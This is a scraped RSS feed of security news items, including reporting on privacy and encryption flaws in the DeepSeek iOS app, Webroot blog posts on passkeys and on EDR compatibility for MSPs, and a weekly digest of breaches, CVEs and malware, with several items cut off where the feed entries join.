&lt;p&gt;Reuters &lt;a href="https://www.reuters.com/world/us/us-treasury-temporarily-agrees-limit-doge-access-amid-privacy-lawsuit-2025-02-06/" rel="noopener" target="_blank"&gt;reported Thursday&lt;/a&gt; that the U.S. Treasury Department had agreed not to give Musk&amp;#8217;s team access to its payment systems while a judge is hearing arguments in a lawsuit by employee unions and retirees alleging Musk illegally searched those records.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Ars Technica&lt;/em&gt; &lt;a href="https://arstechnica.com/tech-policy/2025/02/lawsuit-tries-to-block-doges-access-to-student-loan-data/" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; that The Department of Education (DoE) was sued Friday by a California student association demanding an &amp;#8220;immediate stop&amp;#8221; to DOGE&amp;#8217;s &amp;#8220;unlawfully&amp;#8221; digging through student loan data to potentially dismantle the DoE.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70358</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>The Coming Storm</category><category>AS400495</category><category>BackConnect Security LLC</category><category>Curtis Gervais</category><category>DiamondCDN</category><category>Director of National Intelligence</category><category>DOGE</category><category>Dstat</category><category>Edward Coristine</category><category>Elon Musk</category><category>Eric Taylor</category><category>Marshal Webb</category><category>Neuralink</category><category>Packetware</category><category>Path Networks</category><category>President Trump</category><category>Rivage</category><category>Tesla Sexy LLC</category><category>The Com</category><category>Tucker Preston</category><category>wired</category></item><item><title>PRESS RELEASE: United Kingdom goes after Apple’s encrypted data</title><link>http://privacyinternational.org/press-release/5520/press-release-united-kingdom-goes-after-apples-encrypted-data</link><guid isPermaLink="false">5520 at http://privacyinternational.org</guid></item><item><title>CISA Adds One Known Exploited Vulnerability to Catalog</title><link>https://www.cisa.gov/news-events/alerts/2025/02/07/cisa-adds-one-known-exploited-vulnerability-catalog</link><description>&lt;p&gt;CISA has added one vulnerability to its&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;

Within days, the DeepSeek AI assistant app climbed to the top of the iPhone App Store's "Free Apps" category, overtaking ChatGPT.&lt;/p&gt;
&lt;p&gt;On Thursday, mobile security company &lt;a href="https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/"&gt;NowSecure reported&lt;/a&gt; that the app sends sensitive data over unencrypted channels, making the data readable to anyone who can monitor the traffic. More sophisticated attackers could also tamper with the data while it's in transit. Apple strongly encourages iPhone and iPad developers to enforce encryption of data sent over the wire using ATS (&lt;a href="https://developer.apple.com/documentation/security/preventing-insecure-network-connections"&gt;App Transport Security&lt;/a&gt;). For unknown reasons, that protection is globally disabled in the app, NowSecure said.&lt;/p&gt;
&lt;h2&gt;Basic security protections MIA&lt;/h2&gt;
&lt;p&gt;What’s more, the data is sent to servers that are controlled by ByteDance, the Chinese company that owns TikTok. While some of that data is properly encrypted using transport layer security, once it's decrypted on the ByteDance-controlled servers, it can be cross-referenced with user data collected elsewhere to identify specific users and potentially track queries and other usage.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/02/deepseek-ios-app-sends-data-unencrypted-to-bytedance-controlled-servers/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

But experts caution that many of DeepSeek&amp;#8217;s design choices &amp;#8212; such as using hard-coded encryption keys, and sending unencrypted user and device data to Chinese companies &amp;#8212; introduce a number of glaring security and privacy risks.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-70327" height="417" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/deepseek.png" width="747" /&gt;&lt;/p&gt;
&lt;p&gt;Public interest in the DeepSeek AI chat apps swelled following widespread &lt;a href="https://www.nytimes.com/2025/01/27/business/us-stock-market-deepseek-ai-sp500-nvidia.html" rel="noopener" target="_blank"&gt;media&lt;/a&gt; reports that the upstart Chinese AI firm had managed to match the abilities of cutting-edge chatbots while using a fraction of the specialized computer chips that leading AI companies rely on. As of this writing, DeepSeek is the third most-downloaded &amp;#8220;free&amp;#8221; app on the Apple store, and #1 on Google Play.&lt;/p&gt;
&lt;p&gt;DeepSeek&amp;#8217;s rapid rise caught the attention of the mobile security firm &lt;strong&gt;NowSecure&lt;/strong&gt;, a Chicago-based company that helps clients screen mobile apps for security and privacy threats. In &lt;a href="https://www.nowsecure.com/blog/2025/02/06/nowsecure-uncovers-multiple-security-and-privacy-flaws-in-deepseek-ios-mobile-app/" rel="noopener" target="_blank"&gt;a teardown&lt;/a&gt; of the DeepSeek app published today, NowSecure urged organizations to remove the DeepSeek iOS mobile app from their environments, citing security concerns.&lt;/p&gt;
&lt;p&gt;NowSecure founder &lt;strong&gt;Andrew Hoog&lt;/strong&gt; said they haven&amp;#8217;t yet concluded an in-depth analysis of the DeepSeek app for &lt;strong&gt;Android&lt;/strong&gt; devices, but that there is little reason to believe its basic design would be functionally much different.&lt;/p&gt;
&lt;p&gt;Hoog told KrebsOnSecurity there were a number of qualities about the DeepSeek iOS app that suggest the presence of deep-seated security and privacy risks. For starters, he said, the app collects an awful lot of data about the user&amp;#8217;s device.&lt;/p&gt;
&lt;p&gt;&amp;#8220;They are doing some very interesting things that are on the edge of advanced device fingerprinting,&amp;#8221; Hoog said, noting that one property of the app tracks the device&amp;#8217;s name &amp;#8212; which for many iOS devices defaults to the customer&amp;#8217;s name followed by the type of iOS device.&lt;/p&gt;
&lt;p&gt;The device information shared, combined with the user&amp;#8217;s Internet address and &lt;a href="https://krebsonsecurity.com/2024/10/the-global-surveillance-free-for-all-in-mobile-ad-data/" rel="noopener" target="_blank"&gt;data gathered from mobile advertising companies&lt;/a&gt;, could be used to deanonymize users of the DeepSeek iOS app, NowSecure warned. The report notes that DeepSeek communicates with &lt;strong&gt;Volcengine&lt;/strong&gt;, a cloud platform developed by &lt;strong&gt;ByteDance&lt;/strong&gt; (the makers of &lt;strong&gt;TikTok&lt;/strong&gt;), although NowSecure said it wasn&amp;#8217;t clear if the data is just leveraging ByteDance&amp;#8217;s digital transformation cloud service or if the declared information share extends further between the two companies.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70342" style="width: 760px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/02/deepseek-graphic.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-70342" height="327" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/deepseek-graphic.png" width="750" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-70342"&gt;Image: NowSecure.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Perhaps more concerning, NowSecure said the iOS app transmits device information &amp;#8220;in the clear,&amp;#8221; without any encryption to encapsulate the data. This means the data being handled by the app could be intercepted, read, and even modified by anyone who has access to any of the networks that carry the app&amp;#8217;s traffic.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The DeepSeek iOS app globally disables App Transport Security (ATS) which is an iOS platform level protection that prevents sensitive data from being sent over unencrypted channels,&amp;#8221; the report observed. &amp;#8220;Since this protection is disabled, the app can (and does) send unencrypted data over the internet.&amp;#8221;&lt;span id="more-70323"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Hoog said the app does selectively encrypt portions of the responses coming from DeepSeek servers. But they also found it uses an insecure and now deprecated encryption algorithm called 3DES (aka &lt;a href="https://en.wikipedia.org/wiki/Triple_DES" rel="noopener" target="_blank"&gt;Triple DES&lt;/a&gt;), and that the developers had hard-coded the encryption key. That means the cryptographic key needed to decipher those data fields can be extracted from the app itself.&lt;/p&gt;
&lt;p&gt;There were other, less alarming security and privacy issues highlighted in the report, but Hoog said he&amp;#8217;s confident there are additional, unseen security concerns lurking within the app&amp;#8217;s code.&lt;/p&gt;
&lt;p&gt;&amp;#8220;When we see people exhibit really simplistic coding errors, as you dig deeper there are usually a lot more issues,&amp;#8221; Hoog said. &amp;#8220;There is virtually no priority around security or privacy. Whether cultural, or mandated by China, or a witting choice, taken together they point to significant lapse in security and privacy controls, and that puts companies at risk.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Apparently, plenty of others share this view. &lt;em&gt;Axios&lt;/em&gt; &lt;a href="https://www.axios.com/2025/01/30/house-congress-bans-deepseek-ai" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; on January 30 that U.S. congressional offices are being warned not to use the app.&lt;/p&gt;
&lt;p&gt;&amp;#8220;[T]hreat actors are already exploiting DeepSeek to deliver malicious software and infect devices,&amp;#8221; read the notice from the chief administrative officer for the House of Representatives. &amp;#8220;To mitigate these risks, the House has taken security measures to restrict DeepSeek’s functionality on all House-issued devices.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;TechCrunch&lt;/em&gt; &lt;a href="https://techcrunch.com/2025/02/03/deepseek-the-countries-and-agencies-that-have-banned-the-ai-companys-tech/" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; that Italy and Taiwan have already moved to ban DeepSeek over security concerns. &lt;em&gt;Bloomberg&lt;/em&gt; &lt;a href="https://www.bloomberg.com/news/articles/2025-01-30/pentagon-workers-used-deepseek-s-chatbot-for-days-before-block" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; that &lt;strong&gt;The Pentagon&lt;/strong&gt; has blocked access to DeepSeek. &lt;em&gt;CNBC&lt;/em&gt; &lt;a href="https://www.cnbc.com/2025/01/31/nasa-becomes-latest-federal-agency-to-block-chinas-deepseek.html" rel="noopener" target="_blank"&gt;says&lt;/a&gt; &lt;strong&gt;NASA&lt;/strong&gt; also banned employees from using the service, as did the &lt;strong&gt;U.S. Navy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Beyond security concerns tied to the DeepSeek iOS app, there are indications the Chinese AI company may be playing fast and loose with the data that it collects from and about users. On January 29, researchers at &lt;strong&gt;Wiz&lt;/strong&gt; &lt;a href="https://www.wiz.io/blog/wiz-research-uncovers-exposed-deepseek-database-leak" rel="noopener" target="_blank"&gt;said&lt;/a&gt; they discovered a publicly accessible database linked to DeepSeek that exposed &amp;#8220;a significant volume of chat history, backend data and sensitive information, including log streams, API secrets, and operational details.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;More critically, the exposure allowed for full database control and potential privilege escalation within the DeepSeek environment, without any authentication or defense mechanism to the outside world,&amp;#8221; Wiz wrote. [Full disclosure: Wiz is currently an advertiser on this website.]&lt;/p&gt;
&lt;p&gt;KrebsOnSecurity sought comment on the report from DeepSeek and from Apple.

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/05/passkeys-the-future-of-secure-and-seamless-authentication/" rel="nofollow"&gt;Passkeys: The future of secure and seamless authentication&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;What are passkeys?&lt;/h2&gt;



&lt;p&gt;You may have seen the term &amp;#8220;passkeys&amp;#8221; appearing more frequently in tech news, app updates, and security discussions. Major companies like Apple, Google, and Microsoft are rolling out passkeys as a replacement for passwords, promising both enhanced security and a smoother user experience. But what exactly are passkeys, and why are they considered the future of authentication?&lt;/p&gt;



&lt;p&gt;With Password Day coming up this Saturday, it&amp;#8217;s the perfect time to discuss the future of authentication. Passwords have long been the foundation of online security, but they come with significant downsides: they can be stolen, guessed, or reused across multiple sites. Enter passkeys, a next-generation authentication technology designed to replace passwords entirely with a more secure and user-friendly alternative.&lt;/p&gt;



&lt;p&gt;Passkeys leverage public-key cryptography to authenticate users without requiring them to remember or type in a password. Instead, passkeys are stored on a trusted device (like your phone, laptop, or tablet) and are accessed using biometrics (Face ID, fingerprint), a PIN, or other device authentication methods. This means&amp;nbsp;&lt;strong&gt;no more passwords to remember, reset, or leak in data breaches&lt;/strong&gt;.&lt;/p&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;&lt;a href="https://www.brighttalk.com/webcast/18665/620476" rel="noreferrer noopener" target="_blank"&gt;Check out our recent webinar where we discuss passkeys&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;How do passkeys work?&lt;/h2&gt;



&lt;p&gt;Passkeys function using a public and private&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;key pair:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;The public key&lt;/strong&gt; is stored on the website or service you’re signing into.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;The private key&lt;/strong&gt; stays securely on your device and is never shared.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;When you log in, the website asks your device to prove that it holds the correct private key. Your device then uses biometric authentication (like Face ID or a fingerprint) to confirm your identity, and the cryptographic exchange verifies you without transmitting a password over the internet. This makes passkeys resistant to &lt;strong&gt;phishing, credential stuffing, and brute-force attacks.&lt;/strong&gt;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2025/02/05130002/passkey2.jpg"&gt;&lt;img alt="Color illustration of a latch key." class="wp-image-33673" height="504" src="https://blog-en.webroot.com/wp-content/uploads/2025/02/05130002/passkey2.jpg" width="940" /&gt;&lt;/a&gt;&lt;/figure&gt;

&lt;h2 class="wp-block-heading"&gt;Pros of passkeys&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;1. Enhanced security&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;No passwords mean no risk of phishing attacks, password leaks, or brute-force attacks.&lt;/li&gt;



&lt;li&gt;Passkeys are unique for every website, preventing credential reuse across multiple accounts.&lt;/li&gt;



&lt;li&gt;Resistant to man-in-the-middle (MitM) attacks because private keys are never shared.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;2. Seamless user experience&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;No need to remember or type passwords—simply authenticate with Face ID, a fingerprint, or a PIN.&lt;/li&gt;



&lt;li&gt;Logging in is faster and easier, especially on mobile devices.&lt;/li&gt;



&lt;li&gt;Syncs automatically across devices when backed up in Apple iCloud Keychain, Google Password Manager, or Microsoft Account.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;3. Built-in multifactor authentication (MFA)&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Traditional MFA often requires entering a one-time passcode (OTP), which can be intercepted.&lt;/li&gt;



&lt;li&gt;Passkeys combine possession (your device) and biometric authentication, making them more secure than passwords + SMS codes.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;4. No centralized password database to hack&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Unlike traditional login systems that store passwords in a database (which hackers can breach), passkeys store only public keys on websites, reducing the risk of massive data breaches.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;5. Reduced risk of social engineering&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Attackers can’t trick users into revealing passkeys like they do with passwords.&lt;/li&gt;



&lt;li&gt;Since passkeys are bound to specific websites, even if a hacker creates a fake login page, they won’t be able to use the stolen passkey elsewhere.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Cons of passkeys&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;1. Device dependency&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Passkeys are tied to your device, meaning if you lose access to your phone or laptop, you could have trouble logging in.&lt;/li&gt;



&lt;li&gt;Solution: Enable cloud backups through iCloud Keychain (Apple), Google Password Manager (Android/Chrome), or Microsoft Account.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;2. Not all websites support passkeys yet&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;While adoption is growing, not every website or service currently supports passkeys.&lt;/li&gt;



&lt;li&gt;Workaround: You may still need to use passwords for some sites while passkey adoption expands.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;3. Migration challenges&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Users switching between ecosystems (Apple to Android or vice versa) may need to manually transfer passkeys.&lt;/li&gt;



&lt;li&gt;Solution: Some platforms allow exporting and importing passkeys, but it&amp;#8217;s not always seamless.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;4. Learning curve for some users&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Users unfamiliar with biometrics, password managers, or cryptographic authentication might find passkeys confusing at first.&lt;/li&gt;



&lt;li&gt;Solution: Tech companies are working on better onboarding experiences to help ease the transition.Users unfamiliar with biometrics, password managers, or cryptographic authentication might find passkeys confusing at first.&lt;/li&gt;



&lt;li&gt;Solution: Tech companies are working on better onboarding experiences to help ease the transition.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2025/02/05132738/passkey3.jpg"&gt;&lt;img alt="" class="wp-image-33679" height="398" src="https://blog-en.webroot.com/wp-content/uploads/2025/02/05132738/passkey3.jpg" width="946" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading"&gt;&lt;br /&gt;What happens if you lose your phone?&lt;/h2&gt;



&lt;p&gt;Losing your device when using passkeys can be a concern, but here’s how to handle it:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;1. Use a backup device&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you’ve set up passkeys on multiple devices (e.g., phone, tablet, laptop), you can log in using another device.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;2. Restore from cloud backup&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Apple, Google, and Microsoft automatically sync passkeys across devices using their respective cloud services.&lt;/li&gt;



&lt;li&gt;When setting up a new phone, simply&lt;strong&gt; log into your cloud account&lt;/strong&gt; to restore access.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;3. Account recovery options&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Many services still offer fallback authentication methods, such as email recovery, SMS codes, or backup keys.&lt;/li&gt;



&lt;li&gt;Some sites allow you to generate a recovery passkey during setup—store this in a safe place!&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;4. Remote device management&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If your phone is lost or stolen, use&amp;nbsp;&lt;strong&gt;Find My Device (Apple, Google)&lt;/strong&gt;&amp;nbsp;to remotely wipe or lock it to prevent unauthorized access.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Why you should consider switching to passkeys&lt;/h2&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Stronger security than passwords&lt;/strong&gt;—no phishing, leaks, or brute-force attacks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Faster logins&lt;/strong&gt;—just use your fingerprint or face instead of typing passwords.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;No password resets&lt;/strong&gt;—forget the frustration of forgetting your credentials.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Growing adoption&lt;/strong&gt;—major companies like Apple, Google, Microsoft, and banks are pushing for passkey implementation.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Passkeys represent a significant shift in authentication, making online accounts &lt;strong&gt;more secure and easier to use.&lt;/strong&gt; While challenges like device loss and adoption gaps still exist, the benefits far outweigh the drawbacks.&lt;/p&gt;



&lt;p&gt;If you haven’t tried passkeys yet, consider setting them up on a supported website. As more services move toward this passwordless future, early adopters will enjoy enhanced security and convenience while leaving the hassles of passwords behind.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/03/mdr-for-msps-navigating-edr-compatibility/" rel="nofollow"&gt;MDR for MSPs: Navigating EDR compatibility&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;When it comes to endpoint detection and response (EDR) compatibility within an MDR offering, managed service providers (MSPs) are weighing two key priorities: native EDR integration or the flexibility to support multiple solutions. According to a recent OpenText survey, opinions are split almost evenly. While 52% of MSPs view native compatibility as moderately or very important, 48% place greater value on flexibility.&lt;/p&gt;



&lt;p&gt;This divide reflects the unique demands MSPs face. On one hand, native compatibility ensures a tight integration. On the other, the ability to work seamlessly with various EDR tools is critical for MSPs managing diverse client environments. For MSPs managing a mix of EDR tools across their customer base, this adaptability can be the difference between a smooth operation and a logistical headache.&lt;/p&gt;



&lt;p&gt;In this blog, we’ll explore why flexibility in EDR compatibility is becoming a critical advantage for MSPs, how it ties into SIEM analysis, and actionable steps MSPs can take when evaluating MDR providers.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;The case for native EDR compatibility&lt;/h2&gt;



&lt;p&gt;For MSPs and their customers, native EDR compatibility can offer advantages, especially when targeting newer companies that have not yet established an EDR infrastructure.&lt;/p&gt;



&lt;p&gt;Here’s why:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Streamlined integration:&lt;/strong&gt;&lt;br /&gt;Native EDR solutions typically provide seamless integration with the MDR platform, simplifying deployment and reducing setup time. This can be particularly appealing for MSPs looking to quickly onboard new customers who do not yet have an EDR solution in place.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ease of use:&lt;/strong&gt;&lt;br /&gt;A native EDR integrated into the MDR platform provides MSPs with a consistent toolset, simplifying training for security teams and boosting overall efficiency and productivity.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;However, for MSPs serving established SMBs that already have an EDR solution, the dynamic changes. An MDR capable of working with any EDR solution often delivers greater flexibility and value by complementing the SMBs’ existing setups.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;When flexible EDR support wins&lt;/h2&gt;



&lt;p&gt;For MSPs, flexibility in EDR support provides a more strategic advantage. Managing security for well-established SMBs often means working within complex, diverse environments where a rigid “one-size-fits-all” approach simply doesn’t work. Here’s why flexible EDR support matters:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Avoiding &amp;#8220;rip and replace:&amp;#8221;&lt;/strong&gt;&lt;br /&gt;Many MSP prospects already have an EDR solution in place that they are comfortable with and that meets their needs. Moving to a new, native EDR can impose a “rip and replace” burden, leading to disruptions and additional costs that may not be acceptable to MSPs.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Supporting diverse client environments:&lt;/strong&gt;&lt;br /&gt;MSPs often manage a variety of EDR products across their customer base. The ability to support multiple EDRs means MSPs can tailor their MDR services to fit the unique needs of each client without forcing them to change their existing security infrastructure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Future-proofing:&lt;/strong&gt;&lt;br /&gt;Flexibility allows MSPs to stay ahead of the curve by ensuring their MDR solution can integrate with emerging EDR tools. This adaptability is crucial in a rapidly evolving cybersecurity landscape.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;The MDR advantage—unifying EDR telemetry through SIEM&lt;/h2&gt;



&lt;p&gt;In a modern MDR solution, the SIEM platform serves as the backbone, ingesting security telemetry from across the customer environment. This includes feeds from firewalls, cloud services, identity providers, and—crucially—EDR solutions. The ability to support multiple EDR tools isn’t just about flexibility; it’s about leveraging the full power of SIEM to deliver more effective and unified threat detection and response.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Centralized visibility:&lt;/strong&gt;&lt;br /&gt;By aggregating telemetry from diverse EDRs and other security tools into a single SIEM platform, MSPs gain a holistic view of the customer’s security posture. This comprehensive perspective enables faster identification of threats and vulnerabilities across the environment.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Improved threat detection:&lt;/strong&gt;&lt;br /&gt;SIEM platforms excel at correlating data from multiple sources. By ingesting streams from EDRs alongside other security feeds, the MDR solution enhances its ability to detect sophisticated threats with greater accuracy and precision, reducing false positives and improving response times.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enhanced reporting and insights:&lt;/strong&gt;&lt;br /&gt;Unified telemetry within the SIEM allows MSPs to generate detailed, actionable reports that highlight trends, identify gaps, and demonstrate the value of their security services. These insights help MSPs guide their clients in making smarter security investments.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Actionable advice for MSPs&lt;/h2&gt;



&lt;p&gt;When choosing an MDR provider, MSPs should keep a few key factors in mind:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;EDR compatibility:&lt;/strong&gt;&lt;br /&gt;Ensure the MDR solution can seamlessly integrate with multiple EDR tools to support your diverse client environments.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;SIEM integration:&lt;/strong&gt;&lt;br /&gt;Look for MDR solutions that can unify EDR telemetry through a centralized SIEM platform.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scalability:&lt;/strong&gt;&lt;br /&gt;Choose an MDR provider that can scale with your business and offers the flexibility to adapt to evolving client needs and emerging cybersecurity challenges.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By prioritizing these factors, MSPs can provide their customers with advanced, efficient, and flexible security solutions that meet their unique needs.&lt;/p&gt;

&lt;li&gt;US healthcare services provider Community Health Center (CHC) has &lt;a href="https://www.forbes.com/sites/larsdaniel/2025/02/01/1000000-patients-exposed--in-healthcare-provider-data-breach/"&gt;been&lt;/a&gt; a victim of a data breach that exposed the sensitive personal and health information of over one million individuals. The breach, which occurred on January 2, 2025, involved unauthorized access to CHC&amp;#8217;s systems, compromising personal details, Social Security numbers, medical information, and financial data.&lt;/li&gt;
&lt;li&gt;The Iranian hacktivistic group Handala &lt;a href="https://therecord.media/hackers-hijack-sirens-iran-israel"&gt;exploited&lt;/a&gt; the emergency systems of various Israeli kindergartens and educational institutions to broadcast alarm sirens and various terrorism supportive songs. The group claimed to have targeted Maagar-Tec, an Israeli electronics firm that operates panic button systems in schools.&lt;/li&gt;
&lt;li&gt;UK-based engineering giant Smiths Group &lt;a href="https://techcrunch.com/2025/01/29/engineering-giant-smiths-group-says-hackers-accessed-its-systems-during-cyberattack/"&gt;disclosed&lt;/a&gt; a cyber-attack involving unauthorized access to its systems. The company has not disclosed when the attack occurred or if any data was exfiltrated. No threat actor has claimed responsibility yet.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A publicly accessible ClickHouse database belonging to the new Chinese AI engine DeepSeek was &lt;a href="https://www.wiz.io/blog/wiz-research-uncovers-exposed-deepseek-database-leak"&gt;found&lt;/a&gt;, exposing over a million lines of log streams. The data included highly sensitive information, such as chat history, API secrets, and backend details. This exposure granted full control over database operations and potential privilege escalation within DeepSeek’s environment due to the absence of authentication or defense mechanisms. The issue was fixed following its disclosure.&lt;/li&gt;
&lt;li&gt;A critical-severity vulnerability (CVE-2024-55591) in Fortinet&amp;#8217;s FortiOS was &lt;a href="https://labs.watchtowr.com/get-fortirekt-i-am-the-super_admin-now-fortios-authentication-bypass-cve-2024-55591/"&gt;reported&lt;/a&gt; as actively exploited in the wild. The flaw, an Authentication Bypass Using an Alternate Path or Channel vulnerability, allows a remote attacker to gain super-admin privileges via crafted requests to Node.js websocket module.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(Fortinet Multiple Products Authentication Bypass (CVE-2024-55591))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Critical vulnerabilities in Node.js versions (v18.x, v20.x, v22.x, v23.x) could &lt;a href="https://cyble.com/blog/critical-vulnerabilities-in-node-js-expose-systems/"&gt;result&lt;/a&gt; in data theft, DoS, and system compromise. Notable vulnerabilities include CVE-2025-23087 through CVE-2025-23089, affecting various versions with issues such as worker permission bypasses, path traversal, and memory leaks. These allow remote attackers to potentially gain unauthorized access, execute arbitrary code, and compromise systems.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Xloader malware, a successor to Formbook known for stealing information from web browsers, email clients, and FTP applications, &lt;a href="https://www.zscaler.com/blogs/security-research/technical-analysis-xloader-versions-6-and-7-part-1"&gt;employs&lt;/a&gt; enhanced obfuscation and encryption techniques like runtime code encryption and NTDLL hook evasion. It establishes persistence by copying itself to specific directories, modifying Windows registry entries, and using process injection.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(Trojan.Win.Xloader; Trojan.Win.Xloader.ja; Trojan.Wins.Xloader.tayc; Trojan.Wins.Xloader.ta.*)&lt;/em&gt;&lt;/p&gt;
